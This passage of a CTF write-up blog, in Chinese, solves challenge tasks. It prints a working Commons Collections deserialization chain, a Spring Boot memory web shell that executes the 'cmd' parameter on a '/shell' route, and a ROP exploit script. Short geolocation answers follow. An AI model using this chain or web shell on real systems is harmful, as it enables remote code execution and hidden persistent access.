com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;</span><br><span class="line">import com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line">import org.apache.commons.collections.functors.FactoryTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateFactory;</span><br><span class="line">import org.apache.commons.collections.map.DefaultedMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Array;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class HashTable_entry &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException, Base64DecodingException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        byte[] code = Base64.decode(&quot;yv66vgAAADEAMQoACAAhCgAiACMIACQKACIAJQcAJgoABQAnBwAoBwApAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAaTGNvbS9jYy9UZXN0VGVtcGxhdGVzSW1wbDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAKgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAFlRlc3RUZW1wbGF0ZXNJbXBsLmphdmEMAAkACgcAKwwALAAtAQAEY2FsYwwALgAvAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAMAAKAQAYY29tL2NjL1Rlc3RUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMAAQAJAAoAAQALAAAAZgACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAMAAAAGgAGAAAADAAEAA4ADQARABAADwARABAAFQASAA0AAAAWAAIAEQAEAA4ADwABAAAAFgAQABEAAAABABIAEwACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFgANAAAAIAADAAAAAQAQABEAAAAAAAEAFAAVAAEAAAABABYAFwACABgAAAAEAAEAGQABABIAGgACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGgANAAAAKgAEAAAAAQAQABEAAAAAAAEAFAAVAAEAAAABABsAHAACAAAAAQAdAB4AAwAYAAAABAABABkAAQAfAAAAAgAg&quot;);</span><br><span class="line"></span><br><span class="line">        //反射设置 Field</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class,new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);</span><br><span class="line">        FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);</span><br><span class="line"></span><br><span class="line">        //LazyMap实例</span><br><span class="line">        Map innerMap1 = new HashMap();</span><br><span class="line">        Map innerMap2 = new HashMap();</span><br><span class="line"></span><br><span class="line">        Map DefaultedMap1 = DefaultedMap.decorate(innerMap1,factoryTransformer);</span><br><span class="line">        DefaultedMap1.put(&quot;yy&quot;, 1);</span><br><span class="line"></span><br><span class="line">        Map DefaultedMap2 = DefaultedMap.decorate(innerMap2,factoryTransformer);</span><br><span class="line">        DefaultedMap2.put(&quot;zZ&quot;, 1);</span><br><span class="line"></span><br><span class="line">        Hashtable hashtable = new Hashtable();</span><br><span class="line">        setFieldValue(hashtable, &quot;count&quot;, 2);</span><br><span class="line">        Class nodeC = Class.forName(&quot;java.util.Hashtable$Entry&quot;);</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(true);</span><br><span class="line">        Object tbl = Array.newInstance(nodeC, 2);</span><br><span class="line">        Array.set(tbl, 0, nodeCons.newInstance(0, DefaultedMap1, 1, null));</span><br><span class="line">        Array.set(tbl, 1, nodeCons.newInstance(0, DefaultedMap2, 2, null));</span><br><span class="line">        setFieldValue(hashtable, &quot;table&quot;, tbl);</span><br><span class="line"></span><br><span class="line">        //序列化</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        //测试反序列化</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object object, String fieldName, Object value) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://ilikeoyt.github.io/image/si11.png" alt="image"></p>
<p>最后再根据提示构造内存马绕过不出网和高版本springboot</p>
<p>注入的内存马如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.context.WebApplicationContext;</span><br><span class="line">import org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line">import org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line">import org.springframework.web.servlet.mvc.condition.*;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class EvilController extends AbstractTranslet &#123;</span><br><span class="line"></span><br><span class="line">    public EvilController() throws Exception&#123;</span><br><span class="line">        // 1. 利用spring内部方法获取context</span><br><span class="line">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br><span class="line">        // 2. 从context中获得 RequestMappingHandlerMapping 的实例</span><br><span class="line">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        // 3. 通过反射获得自定义 controller 中的 Method 对象</span><br><span class="line">        Method method = EvilController.class.getMethod(&quot;test&quot;);</span><br><span class="line">        // 4. 定义访问 controller 的 URL 地址</span><br><span class="line">        PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shell&quot;);</span><br><span class="line">        // 5. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span><br><span class="line">        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();</span><br><span class="line">        // 6. 在内存中动态注册 controller</span><br><span class="line">        Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;);</span><br><span class="line">        configField.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">        RequestMappingInfo info = RequestMappingInfo.paths(&quot;/shell&quot;).options(config).build();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        EvilController springBootMemoryShellOfController = new EvilController(&quot;ycxlo&quot;);</span><br><span class="line">        mappingHandlerMapping.registerMapping(info, springBootMemoryShellOfController, method);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public EvilController(String test)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void test() throws Exception&#123;</span><br><span class="line">        // 获取request和response对象</span><br><span class="line">        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">        // 获取cmd参数并执行命令</span><br><span class="line">        String command = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">        if(command != null)&#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                java.io.PrintWriter printWriter = response.getWriter();</span><br><span class="line">                String o = &quot;&quot;;</span><br><span class="line">                ProcessBuilder p;</span><br><span class="line">                if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;))&#123;</span><br><span class="line">                    p = new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, command&#125;);</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    p = new ProcessBuilder(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, command&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                printWriter.write(o);</span><br><span class="line">                printWriter.flush();</span><br><span class="line">                printWriter.close();</span><br><span class="line">            &#125;catch (Exception ignored)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">package com.example.do_you_know_cc;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;</span><br><span class="line">import com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line">import javassist.CannotCompileException;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.NotFoundException;</span><br><span class="line">import org.apache.commons.collections.functors.FactoryTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateFactory;</span><br><span class="line">import org.apache.commons.collections.map.DefaultedMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Array;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.net.URLEncoder;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException, Base64DecodingException, NoSuchMethodException, InvocationTargetException, InstantiationException, NotFoundException, CannotCompileException &#123;</span><br><span class="line">        byte[] code = Base64.decode(makeClass(&quot;org.example.EvilController&quot;));</span><br><span class="line"></span><br><span class="line">        //反射设置 Field</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class,new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);</span><br><span class="line">        FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);</span><br><span class="line"></span><br><span class="line">        //LazyMap实例</span><br><span class="line">        Map innerMap1 = new HashMap();</span><br><span class="line">        Map innerMap2 = new HashMap();</span><br><span class="line"></span><br><span class="line">        Map DefaultedMap1 = DefaultedMap.decorate(innerMap1,factoryTransformer);</span><br><span class="line">        DefaultedMap1.put(&quot;yy&quot;, 1);</span><br><span class="line"></span><br><span class="line">        Map DefaultedMap2 = DefaultedMap.decorate(innerMap2,factoryTransformer);</span><br><span class="line">        DefaultedMap2.put(&quot;zZ&quot;, 1);</span><br><span class="line"></span><br><span class="line">        Hashtable hashtable = new Hashtable();</span><br><span class="line">        setFieldValue(hashtable, &quot;count&quot;, 2);</span><br><span class="line">        Class nodeC = Class.forName(&quot;java.util.Hashtable$Entry&quot;);</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(true);</span><br><span class="line">        Object tbl = Array.newInstance(nodeC, 2);</span><br><span class="line">        Array.set(tbl, 0, nodeCons.newInstance(0, DefaultedMap1, 1, null));</span><br><span class="line">        Array.set(tbl, 1, nodeCons.newInstance(0, DefaultedMap2, 2, null));</span><br><span class="line">        setFieldValue(hashtable, &quot;table&quot;, tbl);</span><br><span class="line"></span><br><span class="line">        //序列化</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(URLEncoder.encode(new String(Base64.encode(baos.toByteArray()))));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static byte[] makeClass(String className) throws IOException, CannotCompileException, NotFoundException &#123;</span><br><span class="line">        final CtClass clazz;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        clazz = pool.get(className);</span><br><span class="line">        byte[] classBytes = clazz.toBytecode();</span><br><span class="line">        classBytes[7] = 49;</span><br><span class="line">        return Base64.encode(classBytes).getBytes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object object, String fieldName, Object value) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        return field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://ilikeoyt.github.io/image/si12.png" alt="image"></p>
<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="宝塔镇河妖"><a href="#宝塔镇河妖" class="headerlink" title="宝塔镇河妖"></a>宝塔镇河妖</h2><p>直接百度识图就能出（</p>
<h2 id="天桥"><a href="#天桥" class="headerlink" title="天桥"></a>天桥</h2><p>通过左侧的公交专用道标识方法可以判断出来是西安</p>
<p><img src="https://ilikeoyt.github.io/image/si13.png" alt="image"></p>
<p>然后再西安的公交车专用道路线图</p>
<p><img src="https://ilikeoyt.github.io/image/%E9%A5%B2.png" alt="image"></p>
<p>最后查找有梧桐树的路段</p>
<p>即可找到相应的天桥和井盖</p>
<h2 id="美女姐姐"><a href="#美女姐姐" class="headerlink" title="美女姐姐"></a>美女姐姐</h2><p>百度识图可以搜索到中洲岛</p>
<p><img src="https://ilikeoyt.github.io/image/si14.png" alt="image"></p>
<p><img src="https://ilikeoyt.github.io/image/si15.png" alt="image"></p>
<p>烟台山公园</p>
<h2 id="购物之旅"><a href="#购物之旅" class="headerlink" title="购物之旅"></a>购物之旅</h2><p>看到原麦山丘，大概率北京市、再搜索北京华联 找到相同的</p>
<p><img src="https://ilikeoyt.github.io/image/si16.png" alt="image"></p>
<p><img src="https://ilikeoyt.github.io/image/si17.png" alt="image"></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="签到-Shop"><a href="#签到-Shop" class="headerlink" title="[签到]Shop"></a>[签到]Shop</h2><p>连上传入负数即可</p>
<p><img src="https://ilikeoyt.github.io/image/si18.jpg" alt="img"></p>
<h2 id="Different-gadget"><a href="#Different-gadget" class="headerlink" title="Different_gadget"></a>Different_gadget</h2><p>栈溢出通过main函数的wirte函数泄露libc,栈迁移然后写payload成功getshell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">elf=ELF(r&quot;/home/wrwrw/vscode/pwn/SICTF/attachment&quot;)</span><br><span class="line">glibc= ELF(r&quot;/home/wrwrw/vscode/pwn/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;)</span><br><span class="line">debug=False</span><br><span class="line">if debug==True:</span><br><span class="line">    context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;,terminal=&#x27;bash&#x27;)</span><br><span class="line">    p=process(r&quot;/home/wrwrw/vscode/pwn/SICTF/attachment&quot;)</span><br><span class="line">else:</span><br><span class="line">    p=remote(&quot;210.44.151.51&quot;,10107 )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:    </span><br><span class="line">    read_got = elf.got[&quot;read&quot;] # 获取read的got表地址</span><br><span class="line">    wirite_gadget= 0x4011CE</span><br><span class="line">    deadasda = 0xdefdeadf</span><br><span class="line">    main = 0x4011A9</span><br><span class="line">    bss= 0x404058</span><br><span class="line">    p.sendlineafter(&quot;Hello!!!&quot;,p64(read_got).ljust(0x20,b&quot;a&quot;)+p64(bss+0x20)+p64(wirite_gadget))</span><br><span class="line">    # libc_leak = u64(r(8)[:6].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">    p.recv(25*8)</span><br><span class="line">    libc_leak = u64(p.recv(8)[:6].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">    libc_base = libc_leak -128-glibc.symbols[&quot;__libc_start_main&quot;]</span><br><span class="line">    system_got = glibc.symbols[&quot;system&quot;] +libc_base # 获取libc中read的固</span><br><span class="line">    print(&quot;libc_base --------&gt; 0x%x&quot;%libc_base)</span><br><span class="line">    pop_rdi_ret =0x000000000002a3e5+libc_base</span><br><span class="line">    pop_rsi_ret= 0x000000000002be51+libc_base</span><br><span class="line">    pop_rdx_rbx_ret = 0x0000000000090529+libc_base</span><br><span class="line">    one_gadget =0xebcf8+libc_base</span><br><span class="line">    payload =b&quot;A&quot;*0x20+p64(bss+0x20)+p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(0)+p64(pop_rdx_rbx_ret)+p64(0)*2+p64(one_gadget)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://ilikeoyt.github.io/image/si19.png" alt="image"></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="签到-古典大杂烩"><a href="#签到-古典大杂烩" class="headerlink" title="[签到]古典大杂烩"></a>[签到]古典大杂烩</h2><p><img src="https://ilikeoyt.github.io/image/si20.png" alt="image"></p>
<h2 id="Radio"><a href="#Radio" class="headerlink" title="Radio"></a>Radio</h2><p>用中国剩余定理</p>
<p>网上也有类似题目</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 